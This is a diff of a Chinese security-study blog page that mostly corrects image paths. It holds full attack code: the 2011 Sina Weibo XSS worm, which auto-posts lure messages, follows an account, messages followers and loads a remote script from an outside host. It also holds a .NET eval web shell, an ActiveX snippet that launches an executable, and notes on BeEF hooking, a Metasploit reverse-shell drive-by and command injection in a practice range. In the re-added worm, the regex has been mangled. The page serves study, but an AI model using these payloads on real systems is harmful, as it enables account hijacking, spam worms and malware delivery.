 <p>​	**2、**前端UI(更好的与用户做交互)：JavaScript+CSS+HTML  </p>
 <p>​	<strong>3</strong>、Web容器(提供服务的一种程序)：apache，nginx，tomcat，IIs，</p>
 <p>​	**4、**数据库(存放海量数据的)：mysql，sqllite，sqlserver，</p>
-<p><img src="/../images%5Cimage-20230309210335773.png" alt="image-20230309210335773"></p>
+<p><img src="/../images/image-20230309210335773.png" alt="image-20230309210335773"></p>
 <h4 id="身份验证（bp）"><a href="#身份验证（bp）" class="headerlink" title="- 身份验证（bp）"></a>- 身份验证（bp）</h4><p>​	Cookie:   浏览器去做的一个本地验证</p>
-<p><img src="/../images%5Cimage-20230309211646540.png" alt="image-20230309211646540"></p>
+<p><img src="/../images/image-20230309211646540.png" alt="image-20230309211646540"></p>
 <p>​	Session：服务器做一个远程验证</p>
 <p>​	Token:</p>
 <ul>
@@ -682,37 +682,37 @@ print(key_b.decode()) #字节型数据转换成中文数据
 <p>.NET脚本木马</p>
 <p>&lt;%@ Page Language&#x3D;”Jscript”%&gt;&lt;%eval(Request.Item[“z”],”value”);%&gt;</p>
 <p>​		rootkit：恶意软件，结合体的寄生虫，隐藏起来，收集数据。</p>
-<p><img src="/../images%5Cimage-20230310104358522.png" alt="image-20230310104358522"></p>
+<p><img src="/../images/image-20230310104358522.png" alt="image-20230310104358522"></p>
 <p>​		木马：远程控制程序，RCE的利用</p>
-<p><img src="/../images%5Cimage-20230309215040628.png" alt="image-20230309215040628"></p>
+<p><img src="/../images/image-20230309215040628.png" alt="image-20230309215040628"></p>
 <p>​		病毒：隐藏或者藏匿在宿主，寄生虫</p>
 <p>​		宏文件：打开有宏的文件后，病毒就会跑到本机里，然后不断注入到一些文件里。</p>
 <p>​		蠕虫：典型的邮件传播蠕虫，熊猫烧香也算</p>
 <h2 id="一、Xss"><a href="#一、Xss" class="headerlink" title="一、Xss"></a>一、Xss</h2><h3 id="可利用场景："><a href="#可利用场景：" class="headerlink" title="可利用场景："></a>可利用场景：</h3><h4 id="1、劫持-hijcak-：session劫持以及信息劫持。"><a href="#1、劫持-hijcak-：session劫持以及信息劫持。" class="headerlink" title="1、劫持(hijcak)：session劫持以及信息劫持。"></a>1、劫持(hijcak)：session劫持以及信息劫持。</h4><p>​					实现思路：布好xss漏洞陷阱，诱导用户点击访问，获取信息，登录用户后台。</p>
-<p><img src="/../images%5Cimage-20230310140732401.png" alt="image-20230310140732401"></p>
+<p><img src="/../images/image-20230310140732401.png" alt="image-20230310140732401"></p>
 <p>​					流量劫持案例：2011年6月28日新浪被xss攻击事件-》</p>
 <p>​		<a target="_blank" rel="noopener" href="https://www.cnblogs.com/52php/p/5659859.html?utm_id=0">XSS跨站脚本攻击实例讲解，新浪微博XSS漏洞过程分析 - 52php - 博客园 (cnblogs.com)</a></p>
 <p>​		溯源：<a target="_blank" rel="noopener" href="https://56data.cc/262.html">新浪微博的XSS漏洞攻击过程详解 - 不灭的焱 (56data.cc)</a></p>
-<p><img src="/../images%5Cimage-20230310142012887.png" alt="image-20230310142012887"></p>
+<p><img src="/../images/image-20230310142012887.png" alt="image-20230310142012887"></p>
 <p>​					结合了很多，蠕虫，社工 很多</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createXHR</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>?</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>():</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getappkey</span>(<span class="params">url</span>)&#123;</span><br><span class="line">	xmlHttp = <span class="title function_">createXHR</span>();</span><br><span class="line">	xmlHttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">false</span>);</span><br><span class="line">	xmlHttp.<span class="title function_">send</span>();</span><br><span class="line">	result = xmlHttp.<span class="property">responseText</span>;</span><br><span class="line">	id_arr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	id = result.<span class="title function_">match</span>(<span class="regexp">/namecard=\&quot;true\&quot; title=\&quot;[^\&quot;]*/g</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;id.<span class="property">length</span>;i++)&#123;</span><br><span class="line">		sum = id[i].<span class="title function_">toString</span>().<span class="title function_">split</span>(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">3</span>];</span><br><span class="line">		id_arr += sum + <span class="string">&#x27;||&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> id_arr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">random_msg</span>(<span class="params"></span>)&#123;</span><br><span class="line">	link = <span class="string">&#x27; http://163.fm/PxZHoxn?id=&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();;</span><br><span class="line">	<span class="keyword">var</span> msgs = [</span><br><span class="line">		<span class="string">&#x27;郭美美事件的一些未注意到的细节：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;建党大业中穿帮的地方：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;让女人心动的100句诗歌：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;3D肉团团高清普通话版种子：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;这是传说中的神仙眷侣啊：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;惊爆!范冰冰艳照真流出了：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;杨幂被爆多次被潜规则:&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;傻仔拿锤子去抢银行：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;可以监听别人手机的软件：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;个税起征点有望提到4000：&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> msg = msgs[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*msgs.<span class="property">length</span>)] + link;</span><br><span class="line">	msg = <span class="built_in">encodeURIComponent</span>(msg);</span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">post</span>(<span class="params">url,data,sync</span>)&#123;</span><br><span class="line">	xmlHttp = <span class="title function_">createXHR</span>();</span><br><span class="line">    xmlHttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,url,sync);</span><br><span class="line">    xmlHttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Accept&quot;</span>,<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>);</span><br><span class="line">    xmlHttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>);</span><br><span class="line">    xmlHttp.<span class="title function_">send</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">publish</span>(<span class="params"></span>)&#123;            #发微博</span><br><span class="line">	url = <span class="string">&#x27;http://weibo.com/mblog/publish.php?rnd=&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">	data = <span class="string">&#x27;content=&#x27;</span> + <span class="title function_">random_msg</span>() + <span class="string">&#x27;&amp;pic=&amp;styleid=2&amp;retcode=&#x27;</span>;</span><br><span class="line">	<span class="title function_">post</span>(url,data,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">follow</span>(<span class="params"></span>)&#123;                  #加关注</span><br><span class="line">	url = <span class="string">&#x27;http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">	data = <span class="string">&#x27;uid=&#x27;</span> + <span class="number">2201270010</span> + <span class="string">&#x27;&amp;fromuid=&#x27;</span> + $CONFIG.<span class="property">$uid</span> + <span class="string">&#x27;&amp;refer_sort=profile&amp;atnId=profile&#x27;</span>;</span><br><span class="line">	<span class="title function_">post</span>(url,data,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">message</span>(<span class="params"></span>)&#123;               #给粉丝发私信</span><br><span class="line">	url = <span class="string">&#x27;http://weibo.com/&#x27;</span> + $CONFIG.<span class="property">$uid</span> + <span class="string">&#x27;/follow&#x27;</span>;</span><br><span class="line">	ids = <span class="title function_">getappkey</span>(url);</span><br><span class="line">	id = ids.<span class="title function_">split</span>(<span class="string">&#x27;||&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;id.<span class="property">length</span> - <span class="number">1</span> &amp; i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">		msgurl = <span class="string">&#x27;http://weibo.com/message/addmsg.php?rnd=&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">		msg = <span class="title function_">random_msg</span>();</span><br><span class="line">		msg = <span class="built_in">encodeURIComponent</span>(msg);</span><br><span class="line">		user = <span class="built_in">encodeURIComponent</span>(<span class="built_in">encodeURIComponent</span>(id[i]));</span><br><span class="line">		data = <span class="string">&#x27;content=&#x27;</span> + msg + <span class="string">&#x27;&amp;name=&#x27;</span> + user + <span class="string">&#x27;&amp;retcode=&#x27;</span>;</span><br><span class="line">		<span class="title function_">post</span>(msgurl,data,<span class="literal">false</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="title function_">publish</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="title function_">follow</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="title function_">message</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">   x=<span class="string">&quot;g=document.createElement(&#x27;script&#x27;);g.src=&#x27;http://www.2kt.cn/images/t.js&#x27;;document.body.appendChild(g)&quot;</span>;<span class="variable language_">window</span>.<span class="property">opener</span>.<span class="built_in">eval</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line"><span class="title function_">main</span>();</span><br><span class="line"><span class="keyword">var</span> t=<span class="built_in">setTimeout</span>(<span class="string">&#x27;location=&quot;http://weibo.com/pub/topic&quot;;&#x27;</span>,<span class="number">5000</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createXHR</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>?</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>():</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getappkey</span>(<span class="params">url</span>)&#123;</span><br><span class="line">	xmlHttp = <span class="title function_">createXHR</span>();</span><br><span class="line">	xmlHttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">false</span>);</span><br><span class="line">	xmlHttp.<span class="title function_">send</span>();</span><br><span class="line">	result = xmlHttp.<span class="property">responseText</span>;</span><br><span class="line">	id_arr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	id = result.<span class="title function_">match</span>(<span class="regexp">/namecard=/</span><span class="string">&quot;true/&quot;</span> title=<span class="regexp">/&quot;[^/&quot;]*/g</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;id.<span class="property">length</span>;i++)&#123;</span><br><span class="line">		sum = id[i].<span class="title function_">toString</span>().<span class="title function_">split</span>(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">3</span>];</span><br><span class="line">		id_arr += sum + <span class="string">&#x27;||&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> id_arr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">random_msg</span>(<span class="params"></span>)&#123;</span><br><span class="line">	link = <span class="string">&#x27; http://163.fm/PxZHoxn?id=&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();;</span><br><span class="line">	<span class="keyword">var</span> msgs = [</span><br><span class="line">		<span class="string">&#x27;郭美美事件的一些未注意到的细节：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;建党大业中穿帮的地方：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;让女人心动的100句诗歌：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;3D肉团团高清普通话版种子：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;这是传说中的神仙眷侣啊：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;惊爆!范冰冰艳照真流出了：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;杨幂被爆多次被潜规则:&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;傻仔拿锤子去抢银行：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;可以监听别人手机的软件：&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;个税起征点有望提到4000：&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> msg = msgs[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*msgs.<span class="property">length</span>)] + link;</span><br><span class="line">	msg = <span class="built_in">encodeURIComponent</span>(msg);</span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">post</span>(<span class="params">url,data,sync</span>)&#123;</span><br><span class="line">	xmlHttp = <span class="title function_">createXHR</span>();</span><br><span class="line">    xmlHttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,url,sync);</span><br><span class="line">    xmlHttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Accept&quot;</span>,<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>);</span><br><span class="line">    xmlHttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>);</span><br><span class="line">    xmlHttp.<span class="title function_">send</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">publish</span>(<span class="params"></span>)&#123;            #发微博</span><br><span class="line">	url = <span class="string">&#x27;http://weibo.com/mblog/publish.php?rnd=&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">	data = <span class="string">&#x27;content=&#x27;</span> + <span class="title function_">random_msg</span>() + <span class="string">&#x27;&amp;pic=&amp;styleid=2&amp;retcode=&#x27;</span>;</span><br><span class="line">	<span class="title function_">post</span>(url,data,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">follow</span>(<span class="params"></span>)&#123;                  #加关注</span><br><span class="line">	url = <span class="string">&#x27;http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">	data = <span class="string">&#x27;uid=&#x27;</span> + <span class="number">2201270010</span> + <span class="string">&#x27;&amp;fromuid=&#x27;</span> + $CONFIG.<span class="property">$uid</span> + <span class="string">&#x27;&amp;refer_sort=profile&amp;atnId=profile&#x27;</span>;</span><br><span class="line">	<span class="title function_">post</span>(url,data,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">message</span>(<span class="params"></span>)&#123;               #给粉丝发私信</span><br><span class="line">	url = <span class="string">&#x27;http://weibo.com/&#x27;</span> + $CONFIG.<span class="property">$uid</span> + <span class="string">&#x27;/follow&#x27;</span>;</span><br><span class="line">	ids = <span class="title function_">getappkey</span>(url);</span><br><span class="line">	id = ids.<span class="title function_">split</span>(<span class="string">&#x27;||&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;id.<span class="property">length</span> - <span class="number">1</span> &amp; i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">		msgurl = <span class="string">&#x27;http://weibo.com/message/addmsg.php?rnd=&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">		msg = <span class="title function_">random_msg</span>();</span><br><span class="line">		msg = <span class="built_in">encodeURIComponent</span>(msg);</span><br><span class="line">		user = <span class="built_in">encodeURIComponent</span>(<span class="built_in">encodeURIComponent</span>(id[i]));</span><br><span class="line">		data = <span class="string">&#x27;content=&#x27;</span> + msg + <span class="string">&#x27;&amp;name=&#x27;</span> + user + <span class="string">&#x27;&amp;retcode=&#x27;</span>;</span><br><span class="line">		<span class="title function_">post</span>(msgurl,data,<span class="literal">false</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="title function_">publish</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="title function_">follow</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="title function_">message</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">   x=<span class="string">&quot;g=document.createElement(&#x27;script&#x27;);g.src=&#x27;http://www.2kt.cn/images/t.js&#x27;;document.body.appendChild(g)&quot;</span>;<span class="variable language_">window</span>.<span class="property">opener</span>.<span class="built_in">eval</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line"><span class="title function_">main</span>();</span><br><span class="line"><span class="keyword">var</span> t=<span class="built_in">setTimeout</span>(<span class="string">&#x27;location=&quot;http://weibo.com/pub/topic&quot;;&#x27;</span>,<span class="number">5000</span>);</span><br></pre></td></tr></table></figure>
 
 <p>​						</p>
 <h4 id="2、beef的使用"><a href="#2、beef的使用" class="headerlink" title="2、beef的使用"></a>2、beef的使用</h4><p>​					kali启动beef-xss</p>
-<p><img src="/../images%5Cimage-20230309231356588.png" alt="image-20230309231356588"></p>
+<p><img src="/../images/image-20230309231356588.png" alt="image-20230309231356588"></p>
 <p>​					可以更改登录网站的账号密码</p>
-<p><img src="/../images%5Cimage-20230309231453937.png" alt="image-20230309231453937"></p>
+<p><img src="/../images/image-20230309231453937.png" alt="image-20230309231453937"></p>
 <p>​					启动后，在注入网站插入钩子</p>
-<p><img src="/../images%5Cimage-20230309231554726.png" alt="image-20230309231554726"></p>
+<p><img src="/../images/image-20230309231554726.png" alt="image-20230309231554726"></p>
 <p>一旦访问，这边就会显示</p>
-<p><img src="/../images%5Cimage-20230309231914821.png" alt="image-20230309231914821"></p>
+<p><img src="/../images/image-20230309231914821.png" alt="image-20230309231914821"></p>
 <p>​					</p>
-<p><img src="/../images%5Cimage-20230309231950358.png" alt="image-20230309231950358"></p>
+<p><img src="/../images/image-20230309231950358.png" alt="image-20230309231950358"></p>
 <p>​		</p>
-<p><img src="/../images%5Cimage-20230309232037584.png" alt="image-20230309232037584"></p>
+<p><img src="/../images/image-20230309232037584.png" alt="image-20230309232037584"></p>
 <p>​		</p>
 <h4 id="3、挖矿案例"><a href="#3、挖矿案例" class="headerlink" title="3、挖矿案例"></a>3、挖矿案例</h4><p>​					<a target="_blank" rel="noopener" href="https://www.sohu.com/a/233384944_354899">黑客是如何利用你的浏览器进行挖矿的？ (sohu.com)</a></p>
-<p><img src="/../images%5Cimage-20230310104049907.png" alt="image-20230310104049907"></p>
+<p><img src="/../images/image-20230310104049907.png" alt="image-20230310104049907"></p>
 <h4 id="4、网页挂马"><a href="#4、网页挂马" class="headerlink" title="4、网页挂马"></a>4、网页挂马</h4><p>​		一、利用kali制作一个有马的服务器，</p>
 <p>​				制作步骤：开启msfconsole，search ms14_064(可调用powershell)，use exploit，设置srvhost，payload(反弹tcp连接的)，lhost，exploit，生成木马服务器，挂出去。</p>
 <p>​				找到站点，利用xss洞将我们的木马服务器链接挂上去，等待鱼儿上钩就好。</p>
@@ -737,26 +737,26 @@ print(key_b.decode()) #字节型数据转换成中文数据
 
 <h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">    <span class="keyword">var</span> objShell = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;wscript.shell&quot;</span>);</span><br><span class="line">	objShell.<span class="title class_">Run</span>(<span class="string">&quot;G:/work/XSS/WebRoot/Md5.exe&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images%5Cimage-20230310102122281.png" alt="image-20230310102122281"></p>
+<p><img src="/../images/image-20230310102122281.png" alt="image-20230310102122281"></p>
 <p>​		</p>
 <h2 id="二、RCE"><a href="#二、RCE" class="headerlink" title="二、RCE"></a>二、RCE</h2><p>​	    <strong>远程代码执行和远程命令执行</strong></p>
 <p>任何有可执行命令的接口，都可以尝试寻找一些rce的突破点。URL上；</p>
-<p><img src="/../images%5Cimage-20230310143001190.png" alt="image-20230310143001190"></p>
+<p><img src="/../images/image-20230310143001190.png" alt="image-20230310143001190"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#一些系统命令执行函数</span><br><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
 
 <h4 id="BUUCTF-BUUCTF在线评测-buuoj-cn"><a href="#BUUCTF-BUUCTF在线评测-buuoj-cn" class="headerlink" title="BUUCTF:BUUCTF在线评测 (buuoj.cn)"></a>BUUCTF:<a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF在线评测 (buuoj.cn)</a></h4><h3 id="皮卡丘靶场分析："><a href="#皮卡丘靶场分析：" class="headerlink" title="皮卡丘靶场分析："></a>皮卡丘靶场分析：</h3><h5 id="1、exec-“ping”"><a href="#1、exec-“ping”" class="headerlink" title="1、exec “ping”"></a>1、exec “ping”</h5><p> 127.0.0.1，尝试ping，发现有回显，利用&amp;&amp;堆叠whoami</p>
-<p><img src="/../images%5Cimage-20230302160806954.png" alt="image-20230302160806954"></p>
+<p><img src="/../images/image-20230302160806954.png" alt="image-20230302160806954"></p>
 <p>至此，发现了目标系统可，可进一步利用。（whoami,ipconfig,dir,）</p>
-<p><img src="/../images%5Cimage-20230302161243440.png" alt="image-20230302161243440"></p>
+<p><img src="/../images/image-20230302161243440.png" alt="image-20230302161243440"></p>
 <h5 id="2、exec-‘evel’"><a href="#2、exec-‘evel’" class="headerlink" title="2、exec ‘evel’"></a>2、exec ‘evel’</h5><p> phpinfo();</p>
-<p><img src="/../images%5Cimage-20230302162935650.png" alt="image-20230302162935650"></p>
+<p><img src="/../images/image-20230302162935650.png" alt="image-20230302162935650"></p>
 <p>phpinfo()有回显后，我们看一下数据请求头的类型，发现对应参数是txt</p>
-<p><img src="/../images%5Cimage-20230302165339168.png" alt="image-20230302165339168"></p>
+<p><img src="/../images/image-20230302165339168.png" alt="image-20230302165339168"></p>
 <p>我们连接蚁剑，并对蚁剑进行设置。</p>
-<p><img src="/../images%5Cimage-20230302165534876.png" alt="image-20230302165534876"></p>
-<p><img src="/../images%5Cimage-20230302165516674.png" alt="image-20230302165516674"></p>
+<p><img src="/../images/image-20230302165534876.png" alt="image-20230302165534876"></p>
+<p><img src="/../images/image-20230302165516674.png" alt="image-20230302165516674"></p>
 <p>成功控制</p>
-<p><img src="/../images%5Cimage-20230302165600052.png" alt="image-20230302165600052"></p>
+<p><img src="/../images/image-20230302165600052.png" alt="image-20230302165600052"></p>
